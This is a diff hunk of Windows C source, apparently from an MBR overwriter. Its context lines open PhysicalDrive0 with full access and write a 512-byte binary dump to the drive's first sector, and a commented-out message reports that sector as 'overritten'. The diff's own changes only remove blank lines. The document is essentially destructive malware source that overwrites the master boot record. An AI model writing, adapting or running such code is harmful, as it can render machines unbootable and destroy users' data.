@@ -17,7 +17,6 @@ int main(){
    HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 
 if (drive != INVALID_HANDLE_VALUE){
-
 	
   DWORD size = 512;
   
@@ -25,7 +24,6 @@ if (drive != INVALID_HANDLE_VALUE){
                     //ok,now lets write the contents of the binary file,to the first sector of the drive
 
                     if (WriteFile(drive, binDump, size, &dw, 0)){
-
                         //printf("First sector overritten successfuly!\n");
                     }
   
@@ -34,5 +32,4 @@ if (drive != INVALID_HANDLE_VALUE){
 
 return 0;
 }
-
 }
